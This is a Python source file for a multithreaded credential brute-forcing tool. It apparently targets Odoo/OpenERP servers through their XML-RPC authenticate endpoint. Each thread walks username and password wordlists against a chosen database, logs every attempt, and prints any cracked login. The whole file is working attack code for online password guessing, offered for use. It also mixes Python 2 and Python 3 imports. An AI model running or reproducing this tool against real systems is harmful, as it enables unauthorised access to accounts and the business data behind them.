# -*- coding: utf-8 -*-
import threading
import datetime
import xmlrpclib as xrl
import builtins

from utils.file.filehandler import FileHandler
from utils.format.color import color
from utils.format.output import Output
from utils.functions.generic import *
from utils.timer.processtimer import ProcessTimer


class WorkerThread(threading.Thread):
    """
        Each thread has a set of password to try
        TODO: Improve distribution
    """

    def __init__(self, thread_id, start_from, stop_at, args):

        threading.Thread.__init__(self)
        self.id = thread_id
        self.start_from = start_from
        self.stop_at = stop_at
        self.args = args

        output = Output()

        output.out("[+] Thread {0}. Start from: {1}. Stop at: {2}"
            .format(self.id, self.start_from, self.stop_at))

    def _should_run(self):
        return builtins.run_main_app

    def _stop_running(self):
        builtins.run_main_app = False

    def execute(self):
        do_run = True
        while do_run:
            Color = color()
            output = Output(self.args.vv)
            ptimer = ProcessTimer()
            fh_user = FileHandler()
            fh_pass = FileHandler()

            output.out("[+] T{0} - Started at: {1}"
                .format(self.id, str(datetime.datetime.now())))

            output.out("[+] T{1} - Elapsed: {0}"
                .format(ptimer.get_time(), self.id))

            usrfile = self.args.usrfile[0]
            pwdfile = self.args.pwdfile[0]

            # Reading all users
            user_fp = fh_user.seek_from_line(usrfile, 0)
            # Reading passwords assigned to this thread
            pass_fp = fh_pass.seek_from_line(pwdfile, self.start_from)

            file_usr_content = user_fp.readlines()
            file_pwd_content = pass_fp.readlines()

            lines_usernames = len(file_usr_content)
            lines_passwords = self.stop_at - self.start_from + 1

            output.out("[+] T{2} -> Total users: {0}\tTotal passwords: {1}".format(
                lines_usernames,
                lines_passwords,
                self.id
            ))

            output.out("[+] T{1} -> Total attempts: {0}".format(
                Color.bold(lines_usernames * lines_passwords),
                self.id
            ))

            db = self.args.db[0]

            # Trying to attack each one
            #for db in dbs_splitted:

            login_url = ("http://{0}:{1}/xmlrpc/2/common").format(
                self.args.host[0], self.args.port[0]
            )

            for username in file_usr_content:
                username = username.strip()

                # Counter Password attempts
                number_pass = 0
                t_total_attempts = self.stop_at - self.start_from

                for password in file_pwd_content:
                    if not self._should_run():
                        do_run = False
                        break

                    if (number_pass > t_total_attempts):
                        do_run = False
                        break

                    number_pass += 1

                    password = password.strip()

                    output.out(("|-> T{0} - Checking {1}:{2} (db:{3})  ")
                        .format(self.id, username, password, db),
                        backspace=True)

                    # Login attempt
                    try:
                        login_obj = xrl.ServerProxy("%s" % (login_url))
                        uid = login_obj.authenticate(
                            db, username, password, {}
                        )

                        #time.sleep(0.1)

                        if (uid is False):
                            output.out('   {0}'.format(
                                Color.bold(Color.fail("FAILED"))
                            ))

                        else:
                            output.out('   {0}'
                                .format(Color.bold(Color.green("SUCCESS"))))

                            output.out(("|-> T{0} - {1} {2}:{3} (db:{4})  ")
                                .format(self.id, Color.green("Success!"),
                                    Color.bold(username), Color.bold(password),
                                    Color.warning(db)), force_show=True)

                            if (not self.args.c):
                                # Stop the process
                                user_fp.close()
                                pass_fp.close()
                                self._stop_running()
                                do_run = False
                                break

                    except xrl.Fault as xml_fault:
                        code = xml_fault.faultCode
                        message = xml_fault.faultString

                        if (code == 1):
                            output.error("[-] T{3} - Error Database {0} "
                                "does not exist or Pool full. "
                                "Please retry or decrease --threads"
                                " {0}:username:{1} - password:{2}"
                                .format(db, username, password, self.id))
                            output.out("[-] Error: {0} - {1}"
                                .format(code, message))

                            # Error - stop the process
                            user_fp.close()
                            pass_fp.close()
                            self._stop_running()
                            do_run = False
                            break

                        else:
                            output.error(('[-] Unhandled XMLRPC, please '
                            'retry {0}:username:{1} - password:{2}'
                                'Exception: {3}')
                                .format(db, username, password, code))
                            output.out("[-] Error: {0} - {1}"
                                .format(code, message))

                    except Exception as e:
                        output.error("[-] Error while connecting , please"
                            " retry db:{0} username:{1}-password:{2}"
                            .format(db, username, password))
                        output.out("[-] Error: {0}".format(e))
            # Stop this thread
            do_run = False

        user_fp.close()
        pass_fp.close()

        output.out("[+] T{1} - Process finished at: {0}"
            .format(str(datetime.datetime.now()), self.id))
        output.out("[+] T{1} - Elapsed: {0}"
            .format(ptimer.get_time(), self.id))

    def run(self):
        self.execute()
